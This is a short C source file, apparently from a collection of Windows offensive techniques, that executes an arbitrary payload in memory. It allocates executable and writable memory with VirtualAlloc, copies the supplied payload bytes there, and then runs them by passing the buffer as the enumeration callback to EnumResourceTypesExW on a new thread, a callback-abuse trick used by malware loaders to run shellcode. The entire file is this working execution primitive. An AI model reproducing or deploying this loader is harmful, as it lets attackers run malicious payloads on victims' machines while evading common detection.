#include "Win32Helper.h"

VOID InvokeEnumResourceTypesExWThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumResourceTypesExW(NULL, (ENUMRESTYPEPROCW)lpParameter, NULL, RESOURCE_ENUM_VALIDATE, NULL);
}

BOOL MpfSceViaEnumResourceTypesExW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumResourceTypesExWThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}